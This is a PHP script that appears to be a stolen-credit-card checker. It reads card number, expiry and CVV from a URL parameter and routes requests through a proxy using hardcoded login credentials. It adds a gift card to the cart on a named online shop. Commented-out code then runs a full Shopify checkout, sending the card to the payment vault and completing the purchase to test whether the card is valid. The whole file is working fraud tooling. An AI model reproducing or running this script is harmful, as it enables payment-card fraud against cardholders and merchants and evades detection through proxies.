<?php 

	error_reporting(E_ALL);
	@unlink(getcwd().'/cookie.txt');


	$lista = $_GET['lista'];
	$cc  = explode("|", $lista)[0];
	$mes = explode("|", $lista)[1];
	$ano = explode("|", $lista)[2];
	$cvv = explode("|", $lista)[3];

	$mes2 = substr($mes,1,2);
	$num1 = substr($cc, 0,4);
	$num2 = substr($cc, 4,4);
	$num3 = substr($cc, 8,4);
	$num4 = substr($cc, 12,4);

	function getdata($string, $start,$end){
		$uno = explode($start, $string);
		$dos = explode($end,$uno[1]);
		return $dos[0];
	}

	function Capture($str, $starting_word, $ending_word){
	    $subtring_start  = strpos($str, $starting_word);
	    $subtring_start += strlen($starting_word);   
	    $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
	    return substr($str, $subtring_start, $size);
	}

	$proxy = [
		'isp2.hydraproxy.com'
	];

	$retry = 0;
	
	start:

	if ($retry == 3) {
		echo "intents: $retry<br><hr>";
		echo "error_curl: ".curl_error($ch)."<br><hr>";
		exit;
	}

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://www.thesteelshop.com/cart/add');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)].':9989');
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sahi47614gkur128545:zTHpihrrK12Wpdco');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarySCa1hHnfOnQ3jvmY
Content-Disposition: form-data; name="Amount"

$50 USD
------WebKitFormBoundarySCa1hHnfOnQ3jvmY
Content-Disposition: form-data; name="form_type"

product
------WebKitFormBoundarySCa1hHnfOnQ3jvmY
Content-Disposition: form-data; name="utf8"

✓
------WebKitFormBoundarySCa1hHnfOnQ3jvmY
Content-Disposition: form-data; name="data-product-id"

8930817612
------WebKitFormBoundarySCa1hHnfOnQ3jvmY
Content-Disposition: form-data; name="add"


------WebKitFormBoundarySCa1hHnfOnQ3jvmY
Content-Disposition: form-data; name="id"

30851884620
------WebKitFormBoundarySCa1hHnfOnQ3jvmY--');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
	$headers = array();
	$headers[] = 'Authority: www.thesteelshop.com';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
	$headers[] = 'Accept-Language: en-US,en;q=0.9';
	$headers[] = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySCa1hHnfOnQ3jvmY';
	$headers[] = 'Sec-Fetch-Dest: empty';
	$headers[] = 'Sec-Fetch-Mode: cors';
	$headers[] = 'Sec-Fetch-Site: same-origin';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.105 Safari/537.36';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

	$r1 = curl_exec($ch);
echo $r1;

 //    $ch = curl_init();
	// curl_setopt($ch, CURLOPT_URL, 'https://thursdayboots.com/checkout');
	// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	// curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)].':9989');
 //    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
 //    curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sahi47614gkur128545:zTHpihrrK12Wpdco');
	// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	// curl_setopt($ch, CURLOPT_HEADER, 1);
	// curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

	// $headers = array();
	// $headers[] = 'Authority: www.thesteelshop.com';
	// $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
	// $headers[] = 'Sec-Fetch-Dest: document';
	// $headers[] = 'Sec-Fetch-Mode: navigate';
	// $headers[] = 'Sec-Fetch-Site: same-origin';
	// $headers[] = 'Upgrade-Insecure-Requests: 1';
	// $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.105 Safari/537.36';
	// curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
	// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

	// $r2 = curl_exec($ch);


	// $Location = Capture($r2,'location:', 'x-sorting-hat-podid');
	// $id_1   = trim(strip_tags(getdata($Location,'https://thursdayboots.com/','/checkouts/')));
	// $id_2   = trim(strip_tags(getdata($Location,'/checkouts/','x-sorting-hat-podid:')));

	// $ch = curl_init();
	// curl_setopt($ch, CURLOPT_URL, 'https://thursdayboots.com/'.$id_1.'/checkouts/'.$id_2.'');
	// curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)].':9989');
 //    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
 //    curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sahi47614gkur128545:zTHpihrrK12Wpdco');
	// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	// 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	// 'referer: https://thursdayboots.com/products/gift-cards',
	// 'user-agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.105 Safari/537.36'
	// ));
	// curl_setopt($ch, CURLOPT_HEADER, 1);
	// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
	// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
	// $r3 = curl_exec($ch);

 //    $authenticity_token  = trim(strip_tags(getdata($r3,'type="hidden" name="authenticity_token" value="','"')));

	// $ch = curl_init();
	// curl_setopt($ch, CURLOPT_URL, 'https://thursdayboots.com/'.$id_1.'/checkouts/'.$id_2.'');
	// curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)].':9989');
 //    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
 //    curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sahi47614gkur128545:zTHpihrrK12Wpdco');
	// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
	// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	// 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	// 'accept-language: es-ES,es;q=0.9',
	// 'content-type: application/x-www-form-urlencoded',
	// 'origin: https://thursdayboots.com',
	// 'referer: https://thursdayboots.com/',
	// 'user-agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.105 Safari/537.36'
	// ));
	// curl_setopt($ch, CURLOPT_HEADER, 1);
	// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	// curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($authenticity_token).'&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D=jadiusadjxad%40gmail.com&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D=asdad&checkout%5Bbilling_address%5D%5Blast_name%5D=ada&checkout%5Bbilling_address%5D%5Baddress1%5D=street+23&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=ny&checkout%5Bbilling_address%5D%5Bprovince%5D=NY&checkout%5Bbilling_address%5D%5Bzip%5D=10080&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=566&checkout%5Bclient_details%5D%5Bbrowser_height%5D=868&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');

	// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
	// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
	// $r4 = curl_exec($ch);

	// $ch = curl_init();
	// curl_setopt($ch, CURLOPT_URL, 'https://thursdayboots.com/'.$id_1.'/checkouts/'.$id_2.'');
	// curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)].':9989');
 //    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
 //    curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sahi47614gkur128545:zTHpihrrK12Wpdco');
	// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	// 'authority: everythingsummercamp.com',
	// 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	// 'referer: https://thursdayboots.com/products/gift-cards',
	// 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36'));
	// curl_setopt($ch, CURLOPT_HEADER, 1);
	// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
	// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
	// $r5 = curl_exec($ch);

	// $authenticity = trim(strip_tags(getdata($r5,'<input type="hidden" name="authenticity_token" value="','"')));


	// $ch = curl_init();
	// curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
	// curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)].':9989');
 //    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
 //    curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sahi47614gkur128545:zTHpihrrK12Wpdco');
	// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
	// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	// 'Accept: application/json',
	// 'Accept-Language: es-ES,es;q=0.9',
	// 'Content-Type: application/json',
	// 'Host: deposit.us.shopifycs.com',
	// 'Origin: https://checkout.shopifycs.com',
	// 'Referer: https://checkout.shopifycs.com/',
	// 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.70'
	// ));
	// curl_setopt($ch, CURLOPT_POSTFIELDS,'{"credit_card":{"number":"'.$num1.' '.$num2.' '.$num3.' '.$num4.'","name":"dsa sadad","month":'.$mes2.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"thursdayboots.com"}');
	// curl_setopt($ch, CURLOPT_HEADER, 0);
	// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
	// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
	// $r8 = curl_exec($ch);

	// $id = trim(strip_tags(getdata($r8,'"id":"','"')));
	

	// $ch = curl_init();
	// curl_setopt($ch, CURLOPT_URL, 'https://thursdayboots.com/'.$id_1.'/checkouts/'.$id_2.'');
	// curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)].':9989');
 //    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
 //    curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sahi47614gkur128545:zTHpihrrK12Wpdco');
	// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
	// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	// 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	// 'accept-language: es-ES,es;q=0.9',
	// 'content-type: application/x-www-form-urlencoded',
	// 'origin: https://thursdayboots.com',
	// 'referer: https://thursdayboots.com/',
	// 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.70'
	// ));
	// curl_setopt($ch, CURLOPT_POSTFIELDS,'_method=patch&authenticity_token='.urlencode($authenticity).'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D=28297953370&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Btotal_price%5D=3000&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=566&checkout%5Bclient_details%5D%5Bbrowser_height%5D=868&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
	// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
	// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
	// $r9 = curl_exec($ch);


	// /*=====  10REQ  ======*/

	// $ch = curl_init();
	// curl_setopt($ch, CURLOPT_URL, 'https://thursdayboots.com/'.$id_1.'/checkouts/'.$id_2.'?from_processing_page=1&validate=true');
	// curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)].':9989');
 //    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
 //    curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sahi47614gkur128545:zTHpihrrK12Wpdco');
	// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	// 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	// 'accept-language: es-ES,es;q=0.9',
	// 'content-type: application/x-www-form-urlencoded',
	// 'origin: https://thursdayboots.com',
	// 'referer: https://thursdayboots.com/',
	// 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.70'
	// ));
	// curl_setopt($ch, CURLOPT_HEADER, 0);
	// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
	// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
	// $r10 = curl_exec($ch);

	// $resq  = trim(strip_tags(getdata($r10,'<div class="notice__content"><p class="notice__text">','</p>')));

	// if (curl_errno($ch) !== 0 && $retry < 4 || empty($r10)) {
 //        $retry++;
 //        goto start;
 //    }

 //    if (empty($resq)) {
 //    	$respuesta = $r10;
 //    }else{
 //    	$respuesta = $resq;
 //    }


	echo "Location: $Location<br><hr>";
	echo "Key 1:$id_1<br><hr>";
	echo "Key 2:$id_2<br><hr>";
	echo "Token :$authenticity_token<br><hr>";
	echo "authenticity :$authenticity<br><hr>";
	echo "id :$id<br><hr>";
	echo "Responce : $respuesta<br><hr>";
	echo "Retrys : $retry<br><hr>";

 ?>